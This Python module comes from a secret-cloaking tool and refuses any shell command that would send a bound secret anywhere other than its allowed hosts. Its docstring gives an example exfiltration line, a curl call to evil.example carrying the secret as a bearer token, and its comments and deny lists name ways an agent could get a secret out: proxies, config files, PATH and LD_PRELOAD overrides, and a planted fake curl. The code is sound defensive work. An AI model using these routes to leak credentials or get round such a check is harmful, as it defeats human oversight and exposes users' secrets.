"""Bind a secret to the hosts it may be sent to.

Output scrubbing keeps a value out of the model's context by accident. It
cannot stop an agent that means to read it: ``| base64``, ``| rev``, a write
to a file and a later ``cat``, or simply ``curl evil.example -H "Bearer
@@SECRET:X@@"``. A bound secret is only ever decloaked into a request to the
hosts it was bound to:

  - every segment of the command that names it must be a plain network client
    call (curl, wget, httpie, xh), not a shell, a pipe into another program,
    an env assignment or a heredoc;
  - every URL that call targets must be on the secret's host list;
  - options that send the request elsewhere or copy it to disk are refused
    (proxies, --resolve, --connect-to, URL globs, --trace, --libcurl,
    config files, httpie sessions, wget logs), and so is a curlrc/wgetrc that
    sets one of them, since an earlier command could have written it.

Unbound secrets behave as before. The check runs in decloak-exec.sh, the one
resolver every shell path goes through (Claude Code hook, MCP mirror, ACP
proxy, Hermes), and in ``prismor cloak run``.

Stdlib only: decloak-exec.sh runs this file as a script.

    PRISMOR_CLOAK_CMD=... python3 bindings.py <secrets_dir>   # exit 0 ok, 3 refused
"""
from __future__ import annotations

import json
import os
import re
import shlex
import sys
from pathlib import Path
from typing import Dict, Iterable, List, Optional
from urllib.parse import urlsplit

PLACEHOLDER = re.compile(r"@@SECRET:([a-zA-Z0-9_-]{1,64})@@")
HOST = re.compile(r"(\*\.)?[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*")

CLIENTS = {"curl", "wget", "http", "https", "xh", "xhs"}

# curl options that take a value (short letters, long names). A value is never
# a URL, except --url's. Unknown long options are taken as flags: their next
# word is then read as a URL and must be an allowed host, so a miss refuses
# rather than lets through.
_CURL_SHORT_ARG = set("AbcCdDeEFHmoQrtTuUwXyYz")
_CURL_LONG_ARG = {
    "user-agent", "cookie", "cookie-jar", "continue-at", "data", "data-ascii",
    "data-binary", "data-raw", "data-urlencode", "json", "dump-header", "referer",
    "cert", "cert-type", "key", "key-type", "pass", "cacert", "capath", "form",
    "form-string", "header", "proxy-header", "max-time", "connect-timeout",
    "output", "output-dir", "range", "telnet-option", "upload-file", "user",
    "write-out", "request", "speed-limit", "speed-time", "time-cond", "quote",
    "retry", "retry-delay", "retry-max-time", "max-filesize", "limit-rate",
    "oauth2-bearer", "aws-sigv4", "ciphers", "tls-max", "max-redirs",
    "keepalive-time", "expect100-timeout", "happy-eyeballs-timeout-ms",
    "parallel-max", "create-file-mode", "request-target", "hostpubmd5",
    "hostpubsha256", "pinnedpubkey", "crlfile", "login-options", "sasl-authzid",
    "service-name", "mail-from", "mail-rcpt", "mail-auth", "ftp-port", "local-port",
    "interface", "ip-tos", "vlan-priority", "url-query",
}
_CURL_DENY_LONG = {
    "proxy", "preproxy", "proxy-user", "proxy-header", "socks4", "socks4a",
    "socks5", "socks5-hostname", "socks5-gssapi-service", "resolve",
    "connect-to", "doh-url", "dns-servers", "location-trusted", "trace",
    "trace-ascii", "libcurl", "stderr", "config", "unix-socket",
    "abstract-unix-socket", "variable", "netrc-file", "haproxy-protocol",
    "haproxy-clientip", "proxy-anyauth", "proxy-basic", "proxy-digest",
}
_CURL_DENY_SHORT = {"x", "K"}

_WGET_SHORT_ARG = set("oaOPUTtwQAReIiBlD")
_WGET_DENY = {"e", "execute", "o", "output-file", "a", "append-output", "i",
              "input-file", "B", "base", "config", "use-proxy", "proxy-user",
              "proxy-password", "rejected-log", "warc-file", "save-headers",
              "load-cookies", "post-file", "body-file"}

_HTTPIE_DENY = {"proxy", "session", "session-read-only"}
_HTTPIE_ARG = {"auth", "auth-type", "output", "o", "a", "A", "verify", "cert",
               "cert-key", "timeout", "max-redirects", "format-options",
               "style", "s", "print", "p", "pretty", "boundary", "raw",
               "ssl", "ciphers", "default-scheme", "session", "proxy"}

_RC_DENY = re.compile(
    r"^\s*-?-?(proxy|preproxy|socks|resolve|connect-to|doh-url|trace|libcurl|"
    r"stderr|config|unix-socket|variable|location-trusted|https?_proxy|use_proxy|"
    r"logfile|output_file|ftp_proxy|no_proxy|x\b)", re.I | re.M)


def hosts_file(secrets_dir: str | os.PathLike[str]) -> Path:
    return Path(secrets_dir) / ".meta" / "hosts.json"


def load(secrets_dir: str | os.PathLike[str]) -> Dict[str, List[str]]:
    """``{name: [host, ...]}``. Unreadable or corrupt: raises, so callers fail closed."""
    path = hosts_file(secrets_dir)
    if not path.exists():
        return {}
    data = json.loads(path.read_text(encoding="utf-8"))
    return {str(k): [str(h) for h in v] for k, v in data.items() if v}


def save(secrets_dir: str | os.PathLike[str], name: str, hosts: Optional[List[str]]) -> None:
    """Set (or with None/[] clear) a secret's hosts. Writes 0600, atomically."""
    path = hosts_file(secrets_dir)
    data = load(secrets_dir) if path.exists() else {}
    if hosts:
        data[name] = sorted({normalize_host(h) for h in hosts})
    else:
        data.pop(name, None)
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    # decloak-exec.sh runs the check with this interpreter, not whatever
    # `python3` is first on PATH when an agent's command runs.
    py = path.with_name("python")
    fd = os.open(py, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        f.write(os.path.realpath(sys.executable))
    tmp = path.with_name(f"hosts.{os.getpid()}.tmp")
    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, sort_keys=True)
    os.replace(tmp, path)


def normalize_host(host: str) -> str:
    """``api.stripe.com`` or ``*.stripe.com``; raises ValueError otherwise."""
    h = host.strip().lower().rstrip(".")
    if not HOST.fullmatch(h) or h.startswith("*.") and h.count(".") < 2:
        raise ValueError(f"not a host name: {host!r} (use api.example.com or *.example.com)")
    return h


def host_allowed(host: str, allowed: Iterable[str]) -> bool:
    host = host.lower().rstrip(".")
    for pattern in allowed:
        if pattern.startswith("*."):
            if host.endswith(pattern[1:]) and host != pattern[2:]:
                return True
        elif host == pattern:
            return True
    return False


def _url_host(word: str) -> Optional[str]:
    """Host a curl/wget/httpie URL word targets, or None if it can't be told."""
    if any(c in word for c in "{}[]") or PLACEHOLDER.search(word.split("?")[0].split("#")[0]):
        return None
    if word.startswith(":"):                      # httpie shorthand :3000/path
        return "localhost"
    url = word if "://" in word else "http://" + word
    try:
        host = urlsplit(url).hostname
    except ValueError:
        return None
    return host if host and HOST.fullmatch(host) else None


def _targets(prog: str, args: List[str]) -> tuple[List[str], Optional[str]]:
    """(URL words, refusal reason) for one client call."""
    urls: List[str] = []
    i = 0
    positional_only = False
    httpie = prog in ("http", "https", "xh", "xhs")
    while i < len(args):
        a = args[i]
        i += 1
        if positional_only or not a.startswith("-") or a == "-":
            urls.append(a)
            continue
        if a == "--":
            positional_only = True
            continue
        if a.startswith("--"):
            name, eq, _ = a[2:].partition("=")
            if prog == "curl":
                if name in _CURL_DENY_LONG or name.startswith(("proxy", "socks", "expand-")):
                    return [], f"curl --{name} can send the request somewhere else or copy it"
                if name == "url":
                    if not eq:
                        if i >= len(args):
                            return [], "curl --url without a value"
                        urls.append(args[i]); i += 1
                    else:
                        urls.append(a.split("=", 1)[1])
                elif name in _CURL_LONG_ARG and not eq:
                    i += 1
            elif prog == "wget":
                if name in _WGET_DENY or "proxy" in name:
                    return [], f"wget --{name} can send the request somewhere else or copy it"
                if not eq and name in {"header", "user-agent", "user", "password",
                                       "http-user", "http-password", "post-data",
                                       "method", "body-data", "output-document",
                                       "directory-prefix", "tries", "timeout",
                                       "referer", "save-cookies", "load-cookies"}:
                    i += 1
            else:
                if name in _HTTPIE_DENY:
                    return [], f"{prog} --{name} can send the request somewhere else or store it"
                if name in _HTTPIE_ARG and not eq:
                    i += 1
            continue
        # short option cluster: -sSL, -H value, -Hvalue, -o file
        cluster = a[1:]
        for j, ch in enumerate(cluster):
            if prog == "curl":
                if ch in _CURL_DENY_SHORT:
                    return [], f"curl -{ch} can send the request somewhere else or read a config"
                if ch in _CURL_SHORT_ARG:
                    if j == len(cluster) - 1:
                        i += 1
                    break
            elif prog == "wget":
                if ch in _WGET_DENY:
                    return [], f"wget -{ch} can send the request somewhere else or copy it"
                if ch in _WGET_SHORT_ARG:
                    if j == len(cluster) - 1:
                        i += 1
                    break
            elif httpie and ch in _HTTPIE_ARG:
                if j == len(cluster) - 1:
                    i += 1
                break
    if httpie:
        # http [METHOD] URL [items...]: only the URL is a target; items carry
        # headers and fields (that is where the placeholder goes).
        pos = [u for u in urls]
        if pos and re.fullmatch(r"[A-Z]+", pos[0]):
            pos = pos[1:]
        urls = pos[:1]
    return urls, None


def _rc_reason(prog: str, env: Dict[str, str]) -> Optional[str]:
    home = env.get("HOME") or os.path.expanduser("~")
    if prog == "curl":
        files = [Path(env["CURL_HOME"]) / ".curlrc"] if env.get("CURL_HOME") else []
        xdg = env.get("XDG_CONFIG_HOME") or os.path.join(home, ".config")
        files += [Path(xdg) / "curlrc", Path(home) / ".curlrc"]
    elif prog == "wget":
        files = [Path(env["WGETRC"])] if env.get("WGETRC") else []
        files.append(Path(home) / ".wgetrc")
    else:
        return None
    for f in files:
        try:
            text = f.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        if _RC_DENY.search(text):
            return f"{f} sets a proxy, resolve, trace or config option {prog} would apply"
    return None


def _untrusted_client(prog: str, env: Dict[str, str]) -> Optional[str]:
    """Refuse a client binary an agent could have written: one that resolves
    into the home directory, a temp directory or the working directory (an
    agent can drop a fake ``curl`` into ``~/.local/bin``, often early on PATH).
    ponytail: a path-prefix check; a user-writable system prefix (Homebrew's
    /opt/homebrew) is still trusted. Pin a client hash if that matters."""
    import shutil
    found = shutil.which(prog, path=env.get("PATH"))
    if not found:
        return f"{prog} is not installed"
    real = os.path.realpath(found)
    home = os.path.realpath(env.get("HOME") or os.path.expanduser("~"))
    risky = [home, os.path.realpath(os.getcwd()), "/tmp", "/private/tmp", "/var/folders",
             "/private/var/folders", os.path.realpath(env.get("TMPDIR") or "/tmp")]
    for prefix in risky:
        if prefix not in ("", "/") and (real == prefix or real.startswith(prefix.rstrip("/") + "/")):
            return f"{prog} resolves to {real}, a location an agent could have written"
    return None


def check_argv(argv: List[str], bound: Dict[str, List[str]],
               env: Optional[Dict[str, str]] = None) -> Optional[str]:
    """Why ``argv`` may not receive the bound secrets it names, or None."""
    names = {n for a in argv for n in PLACEHOLDER.findall(a)} & bound.keys()
    if not names:
        return None
    prog = argv[0] if argv else ""
    label = ", ".join(sorted(names))
    if prog not in CLIENTS:
        return (f"@@SECRET:{label}@@ is bound to its hosts and can only be passed to "
                f"curl, wget, http or xh by name, not {prog or 'this command'}")
    env = env if env is not None else dict(os.environ)
    planted = _untrusted_client(prog, env)
    if planted:
        return planted
    urls, reason = _targets(prog, argv[1:])
    if reason:
        return reason
    rc = _rc_reason(prog, env)
    if rc:
        return rc
    if not urls:
        return f"{prog} call with @@SECRET:{label}@@ names no URL"
    for name in names:
        for u in urls:
            host = _url_host(u)
            if host is None:
                return f"can't tell which host {u!r} targets"
            if not host_allowed(host, bound[name]):
                return (f"@@SECRET:{name}@@ may only be sent to {', '.join(bound[name])}, "
                        f"not {host}")
    return None


_OPS = {"|", "||", "&&", ";", "&", "|&", ";;", "(", ")"}
_REDIR = {">", ">>", "<", ">&", "<&", "&>", ">|", "<>"}


def check_command(command: str, bound: Dict[str, List[str]],
                  env: Optional[Dict[str, str]] = None) -> Optional[str]:
    """Why shell ``command`` may not receive the bound secrets it names, or None."""
    names = set(PLACEHOLDER.findall(command)) & bound.keys()
    if not names:
        return None
    label = ", ".join(sorted(names))
    text = command.replace("\\\n", " ")
    for bad, what in (("`", "a backtick"), ("$(", "command substitution"),
                      ("<(", "process substitution"), (">(", "process substitution"),
                      ("<<", "a heredoc"), ("\n", "a multi-line command")):
        if bad in text:
            return f"@@SECRET:{label}@@ is bound to its hosts; this command uses {what}"
    # Anything that changes what `curl` means for this command.
    # Command position only (start, or after ; & | ( ), so a header value that
    # says "command" or "foo()" is not mistaken for one.
    at_cmd = r"(?:^|[;&|(])\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"
    if re.search(at_cmd + r"(function\s|[\w-]+\s*\(\s*\)|alias\s|unalias\s|hash\s|enable\s|"
                 r"builtin\s|command\s|source\s|\.\s|eval\s|exec\s|set\s|shopt\s)", text) \
            or re.search(r"(?:^|[\s;&|(])(?:export\s+)?(PATH|BASH_ENV|ENV|CURL_HOME|WGETRC|"
                         r"XDG_CONFIG_HOME|HOME|LD_PRELOAD|DYLD_[A-Z_]+)=", text):
        return (f"@@SECRET:{label}@@ is bound to its hosts; the command redefines a "
                "command, the search path or a client config location")
    # `2>/dev/null`: the fd number is part of the redirect, not a URL word.
    text = re.sub(r"(?<=\s)\d+(?=[<>])", "", text)
    lex = shlex.shlex(text, posix=True, punctuation_chars=True)
    lex.whitespace_split = True
    try:
        tokens = list(lex)
    except ValueError as exc:
        return f"can't parse the command: {exc}"
    segments: List[List[str]] = [[]]
    for t in tokens:
        if t in _OPS:
            segments.append([])
        else:
            segments[-1].append(t)
    for seg in segments:
        # A proxy set anywhere in the command applies to the client call.
        for t in seg:
            m = re.match(r"(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)=", t)
            if m and "proxy" in m.group(1).lower():
                return f"@@SECRET:{label}@@ is bound to its hosts; the command sets {m.group(1)}"
        if seg and seg[0] == "export" and any("proxy" in t.lower() for t in seg[1:]):
            return f"@@SECRET:{label}@@ is bound to its hosts; the command sets a proxy"
    for seg in segments:
        if not any(PLACEHOLDER.search(t) for t in seg):
            continue
        words: List[str] = []
        skip = False
        for t in seg:
            if skip:
                skip = False
                if PLACEHOLDER.search(t):
                    return f"@@SECRET:{label}@@ is bound to its hosts; it can't be a redirect target"
                continue
            if t in _REDIR or re.fullmatch(r"\d*[<>]+&?", t):
                skip = True
                continue
            words.append(t)
        while words and re.match(r"[A-Za-z_][A-Za-z0-9_]*=", words[0]):
            if PLACEHOLDER.search(words[0]):
                return (f"@@SECRET:{label}@@ is bound to its hosts and can't go into an "
                        "environment variable; pass it to curl, wget, http or xh directly")
            words = words[1:]
        reason = check_argv(words, bound, env)
        if reason:
            return reason
    return None


if __name__ == "__main__":
    try:
        bound = load(sys.argv[1])
    except Exception as exc:  # corrupt bindings: refuse, never run unchecked
        print(f"prismor cloak: can't read secret bindings ({exc}); refusing", file=sys.stderr)
        sys.exit(3)
    why = check_command(os.environ.get("PRISMOR_CLOAK_CMD", ""), bound)
    if why:
        print(f"prismor cloak refused: {why}", file=sys.stderr)
        sys.exit(3)
